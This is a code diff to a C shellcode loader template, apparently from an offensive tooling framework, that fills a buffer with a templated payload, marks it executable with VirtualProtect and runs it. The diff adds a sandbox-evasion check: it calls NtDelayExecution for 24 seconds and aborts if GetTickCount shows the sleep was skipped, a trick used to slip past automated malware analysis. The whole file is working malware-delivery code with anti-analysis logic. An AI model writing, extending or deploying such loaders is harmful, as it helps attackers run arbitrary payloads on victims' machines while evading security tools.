@@ -4,14 +4,56 @@
 
 char bPayload[SCSIZE] = "<%= payload %>";
 
+typedef union _LARGE_INTEGER {
+    struct {
+        DWORD LowPart;
+        LONG HighPart;
+    } DUMMYSTRUCTNAME;
+    struct {
+        DWORD LowPart;
+        LONG HighPart;
+    } u;
+    __int64 QuadPart;
+    } LARGE_INTEGER, *PLARGE_INTEGER;
+
+typedef NTSTATUS (__stdcall *fnNtDelayExecution)(
+	BOOLEAN              Alertable,
+	PLARGE_INTEGER       DelayInterval
+);
 
 void main() {
 	DWORD dwOldProtect;
-	char* payload_fnc = NULL;
+        char* payload_fnc = NULL;
 
+        //TODO: add random sleep
+
+        DWORD               dwMilliSeconds        = 24000;
+	LARGE_INTEGER       DelayInterval         = { 0 };
+	__int64            Delay                 = NULL;
+        NTSTATUS            STATUS                = NULL;
+        DWORD               _T0                   = NULL, 
+        _T1                   = NULL;
+        
+        Delay = dwMilliSeconds * 10000;
+	DelayInterval.QuadPart = - Delay;
+
+        fnNtDelayExecution fncNtDelayExecution = (fnNtDelayExecution)GetProcAddress(LoadLibrary("ntdll.dll"), "NtDelayExecution");
         payload_fnc = bPayload;
+        VirtualProtect(bPayload, SCSIZE, PAGE_EXECUTE_READWRITE, &dwOldProtect);
 
-	VirtualProtect(bPayload, SCSIZE, PAGE_EXECUTE_READWRITE, &dwOldProtect);
+        _T0 = GetTickCount();
+
+        STATUS = fncNtDelayExecution(FALSE, &DelayInterval);
+        if (STATUS != 0) {
+            return;
+            }
+
+            _T1 = GetTickCount();
+
+            if (_T1 - _T0 < dwMilliSeconds) {
+                return;
+            }
+
 	(*(void (*)()) payload_fnc)();
 	return;
 }
